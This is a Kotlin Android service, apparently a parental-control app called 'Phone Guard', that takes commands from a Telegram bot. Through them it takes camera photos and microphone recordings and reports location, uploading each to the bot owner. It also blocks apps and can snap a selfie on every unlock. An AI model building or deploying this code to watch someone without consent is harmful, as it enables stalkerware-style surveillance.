package com.example.remote

import android.app.*
import android.app.admin.DevicePolicyManager
import android.content.BroadcastReceiver
import android.content.Context
import android.content.Intent
import android.content.IntentFilter
import android.content.pm.PackageManager
import android.content.pm.ServiceInfo
import android.location.LocationManager
import android.media.AudioManager
import android.media.MediaRecorder
import android.os.Build
import android.os.IBinder
import org.json.JSONObject
import java.io.File
import java.net.HttpURLConnection
import java.net.URL
import java.net.URLEncoder
import java.util.concurrent.atomic.AtomicBoolean
import kotlin.concurrent.thread

class ControlService : Service() {

    private val running = AtomicBoolean(false)

    // Токен и chat_id вшиты в APK при сборке
    private val token = BuildConfig.BOT_TOKEN
    private val owner = BuildConfig.OWNER_ID

    private val unlockReceiver = object : BroadcastReceiver() {
        override fun onReceive(c: Context, i: Intent) {
            send("🔓 Телефон разблокировали")
            if (getSharedPreferences("cfg", MODE_PRIVATE).getBoolean("autoselfie", false))
                thread { shoot(true) }
        }
    }

    override fun onBind(i: Intent?): IBinder? = null

    override fun onStartCommand(intent: Intent?, flags: Int, startId: Int): Int {
        val ch = NotificationChannel("guard", "Phone Guard", NotificationManager.IMPORTANCE_LOW)
        getSystemService(NotificationManager::class.java).createNotificationChannel(ch)
        val n = Notification.Builder(this, "guard")
            .setContentTitle("Phone Guard работает")
            .setContentText("Телефон управляется удалённо")
            .setSmallIcon(android.R.drawable.ic_lock_lock)
            .build()
        startForeground(1, n, fgTypes())

        if (running.compareAndSet(false, true)) {
            val f = IntentFilter(Intent.ACTION_USER_PRESENT)
            if (Build.VERSION.SDK_INT >= 33) registerReceiver(unlockReceiver, f, RECEIVER_NOT_EXPORTED)
            else registerReceiver(unlockReceiver, f)
            thread { poll() }
        }
        return START_STICKY
    }

    override fun onDestroy() {
        running.set(false)
        runCatching { unregisterReceiver(unlockReceiver) }
        super.onDestroy()
    }

    // ---------- Telegram ----------

    private fun api(method: String, query: String = ""): String? = try {
        val c = URL("https://api.telegram.org/bot$token/$method?$query").openConnection() as HttpURLConnection
        c.connectTimeout = 15000; c.readTimeout = 40000
        c.inputStream.bufferedReader().readText()
    } catch (e: Exception) { null }

    private fun send(text: String) {
        api("sendMessage", "chat_id=$owner&text=" + URLEncoder.encode(text, "UTF-8"))
    }

    private fun poll() {
        var offset = 0L
        while (running.get()) {
            val body = api("getUpdates", "timeout=30&offset=$offset")
            if (body == null) { Thread.sleep(5000); continue }
            val arr = JSONObject(body).optJSONArray("result") ?: continue
            for (i in 0 until arr.length()) {
                val u = arr.getJSONObject(i)
                offset = u.getLong("update_id") + 1
                val m = u.optJSONObject("message") ?: continue
                if (m.getJSONObject("chat").getLong("id") != owner) continue
                handle(m.optString("text"))
            }
        }
    }

    // ---------- Маппинг коротких имён ----------

    private val FRIENDLY = mapOf(
        "youtube"     to "com.google.android.youtube",
        "kids"        to "com.google.android.apps.youtube.kids",
        "youtubekids" to "com.google.android.apps.youtube.kids",
        "chrome"      to "com.android.chrome",
        "google"      to "com.google.android.googlequicksearchbox",
        "tiktok"      to "com.zhiliaoapp.musically",
        "instagram"   to "com.instagram.android",
        "vk"          to "com.vkontakte.android",
        "telegram"    to "org.telegram.messenger",
        "browser"     to "com.android.browser"
    )

    private fun resolvePkg(name: String) = FRIENDLY[name.lowercase()] ?: name

    // ---------- Команды ----------

    private fun handle(text: String) {
        val parts = text.trim().split(" ")
        val cmd   = parts[0].lowercase().substringBefore("@")
        val arg   = parts.getOrNull(1)
        val prefs = getSharedPreferences("cfg", MODE_PRIVATE)
        val audio = getSystemService(AudioManager::class.java)

        try {
            when (cmd) {
                "/start", "/help" -> send(HELP)

                "/screenoff" -> {
                    getSystemService(DevicePolicyManager::class.java).lockNow()
                    send("✅ Экран выключен")
                }

                "/volume" -> {
                    val pct = (arg?.toIntOrNull() ?: return send("Пример: /volume 70")).coerceIn(0, 100)
                    for (s in listOf(AudioManager.STREAM_MUSIC, AudioManager.STREAM_RING, AudioManager.STREAM_ALARM))
                        audio.setStreamVolume(s, audio.getStreamMaxVolume(s) * pct / 100, 0)
                    send("✅ Громкость $pct%")
                }
                "/unmute" -> { audio.ringerMode = AudioManager.RINGER_MODE_NORMAL; send("✅ Звук включён") }
                "/mute"   -> { audio.ringerMode = AudioManager.RINGER_MODE_SILENT;  send("✅ Беззвучный режим") }

                "/location" -> {
                    val lm  = getSystemService(LocationManager::class.java)
                    val loc = listOf(LocationManager.GPS_PROVIDER, LocationManager.NETWORK_PROVIDER)
                        .mapNotNull { runCatching { lm.getLastKnownLocation(it) }.getOrNull() }
                        .maxByOrNull { it.time }
                    if (loc == null) send("❌ Позиция недоступна — включена ли геолокация?")
                    else send("📍 https://maps.google.com/?q=${loc.latitude},${loc.longitude}\n" +
                              "Точность ~${loc.accuracy.toInt()} м, ${(System.currentTimeMillis() - loc.time) / 1000} с назад")
                }

                "/selfie"     -> thread { shoot(true) }
                "/photo"      -> thread { shoot(false) }
                "/mic"        -> { val sec = (arg?.toIntOrNull() ?: 15).coerceIn(1, 120); thread { record(sec) } }
                "/autoselfie" -> {
                    val on = arg == "on"
                    prefs.edit().putBoolean("autoselfie", on).apply()
                    send(if (on) "✅ Селфи при разблокировке: вкл" else "✅ Селфи при разблокировке: выкл")
                }

                "/block" -> {
                    val pkg = resolvePkg(arg ?: return send("Пример: /block youtube"))
                    val list = prefs.getStringSet("blocklist", mutableSetOf())!!.toMutableSet()
                    list.add(pkg); prefs.edit().putStringSet("blocklist", list).apply()
                    send("🚫 Заблокировано: $pkg")
                }
                "/unblock" -> {
                    val pkg = resolvePkg(arg ?: return send("Пример: /unblock youtube"))
                    val list = prefs.getStringSet("blocklist", mutableSetOf())!!.toMutableSet()
                    list.remove(pkg); prefs.edit().putStringSet("blocklist", list).apply()
                    send("✅ Разблокировано: $pkg")
                }
                "/unlock" -> {
                    val min = (arg?.toIntOrNull() ?: 30).coerceIn(1, 480)
                    prefs.edit().putLong("unlock_until", System.currentTimeMillis() + min * 60_000L).apply()
                    send("✅ Всё разблокировано на $min мин")
                }
                "/lock" -> {
                    prefs.edit().putLong("unlock_until", 0L).apply()
                    send("🚫 Блокировка снова активна")
                }
                "/blocklist" -> {
                    val list        = prefs.getStringSet("blocklist", emptySet()) ?: emptySet()
                    val unlockUntil = prefs.getLong("unlock_until", 0L)
                    val status      = if (System.currentTimeMillis() < unlockUntil)
                        "⏱ Временно открыто — ещё ${(unlockUntil - System.currentTimeMillis()) / 60_000} мин"
                    else "🚫 Блокировка активна"
                    send(if (list.isEmpty()) "$status\nСписок пуст"
                         else "$status\n\nЗаблокировано:\n" + list.joinToString("\n") { "• $it" })
                }
                "/setpin" -> {
                    val newPin = arg ?: return send("Пример: /setpin 4321")
                    prefs.edit().putString("pin", newPin).apply()
                    send("✅ PIN изменён")
                }

                else -> send("Не знаю такую команду. /help")
            }
        } catch (e: Exception) {
            send("❌ Ошибка: ${e.message}")
        }
    }

    // ---------- Камера ----------

    private fun fgTypes(): Int {
        var t = ServiceInfo.FOREGROUND_SERVICE_TYPE_DATA_SYNC
        fun has(p: String) = checkSelfPermission(p) == PackageManager.PERMISSION_GRANTED
        if (has(android.Manifest.permission.ACCESS_FINE_LOCATION)) t = t or ServiceInfo.FOREGROUND_SERVICE_TYPE_LOCATION
        if (has(android.Manifest.permission.CAMERA))               t = t or ServiceInfo.FOREGROUND_SERVICE_TYPE_CAMERA
        if (has(android.Manifest.permission.RECORD_AUDIO))          t = t or ServiceInfo.FOREGROUND_SERVICE_TYPE_MICROPHONE
        return t
    }

    private fun shoot(front: Boolean) {
        val f = File(cacheDir, "shot.jpg")
        Cam.capture(this, front, f) { err ->
            thread {
                if (err != null) send("❌ Фото: ${err.message}")
                else { upload("sendPhoto", "photo", f, if (front) "Фронталка" else "Основная камера"); f.delete() }
            }
        }
    }

    // ---------- Микрофон ----------

    private fun record(sec: Int) {
        val f = File(cacheDir, "rec.m4a")
        try {
            val r = if (Build.VERSION.SDK_INT >= 31) MediaRecorder(this)
                    else @Suppress("DEPRECATION") MediaRecorder()
            r.setAudioSource(MediaRecorder.AudioSource.MIC)
            r.setOutputFormat(MediaRecorder.OutputFormat.MPEG_4)
            r.setAudioEncoder(MediaRecorder.AudioEncoder.AAC)
            r.setOutputFile(f.absolutePath)
            r.prepare(); r.start()
            send("🎙 Пишу $sec с…")
            Thread.sleep(sec * 1000L)
            r.stop(); r.release()
            upload("sendAudio", "audio", f, "Микрофон, $sec с")
            f.delete()
        } catch (e: Exception) { send("❌ Запись: ${e.message}") }
    }

    // ---------- Загрузка файла ----------

    private fun upload(method: String, field: String, file: File, caption: String) {
        try {
            val b = "----guard${System.currentTimeMillis()}"
            val c = URL("https://api.telegram.org/bot$token/$method").openConnection() as HttpURLConnection
            c.doOutput = true; c.requestMethod = "POST"
            c.connectTimeout = 15000; c.readTimeout = 60000
            c.setRequestProperty("Content-Type", "multipart/form-data; boundary=$b")
            c.outputStream.use { o ->
                fun w(s: String) = o.write(s.toByteArray())
                w("--$b\r\nContent-Disposition: form-data; name=\"chat_id\"\r\n\r\n$owner\r\n")
                w("--$b\r\nContent-Disposition: form-data; name=\"caption\"\r\n\r\n$caption\r\n")
                w("--$b\r\nContent-Disposition: form-data; name=\"$field\"; filename=\"${file.name}\"\r\nContent-Type: application/octet-stream\r\n\r\n")
                file.inputStream().use { it.copyTo(o) }
                w("\r\n--$b--\r\n")
            }
            c.inputStream.close()
        } catch (e: Exception) { send("❌ Не отправилось: ${e.message}") }
    }

    companion object {
        const val HELP = """Команды:

📷 Камера:
/selfie — фронталка
/photo — основная камера
/autoselfie on|off — фото при каждой разблокировке

🎙 Микрофон:
/mic 15 — запись 15 с (от 1 до 120)

🔊 Звук и экран:
/screenoff — выключить экран
/volume 0-100 — громкость
/unmute — звук вкл
/mute — беззвучный

📍 Местоположение:
/location — где телефон

🚫 Блокировка:
/block youtube — заблокировать
/unblock youtube — разблокировать
/unlock 30 — открыть всё на 30 мин
/lock — снова заблокировать
/blocklist — список и статус
/setpin 1234 — сменить PIN

Имена: youtube, kids, chrome, google,
tiktok, instagram, vk, telegram"""
    }
}
